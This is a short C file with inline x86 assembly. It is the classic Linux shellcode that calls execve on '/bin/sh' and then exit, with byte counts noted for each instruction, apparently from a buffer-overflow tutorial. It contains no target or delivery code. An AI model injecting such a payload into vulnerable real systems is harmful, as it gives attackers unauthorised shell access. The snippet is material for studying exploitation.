void main() {
__asm__(
        "jmp    0x2a                     # 3 bytes \n\t"
        "popl   %esi                     # 1 byte  \n\t"
        "movl   %esi,0x8(%esi)           # 3 bytes \n\t"
        "movb   $0x0,0x7(%esi)           # 4 bytes \n\t"
        "movl   $0x0,0xc(%esi)           # 7 bytes \n\t"
        "movl   $0xb,%eax                # 5 bytes \n\t"
        "movl   %esi,%ebx                # 2 bytes \n\t"
        "leal   0x8(%esi),%ecx           # 3 bytes \n\t"
        "leal   0xc(%esi),%edx           # 3 bytes \n\t"
        "int    $0x80                    # 2 bytes \n\t"
        "movl   $0x1, %eax               # 5 bytes \n\t"
        "movl   $0x0, %ebx               # 5 bytes \n\t"
        "int    $0x80                    # 2 bytes \n\t" 
        "call   -0x2f                    # 5 bytes \n\t"
        ".string \"/bin/sh\"             # 8 bytes \n\t"
);
}

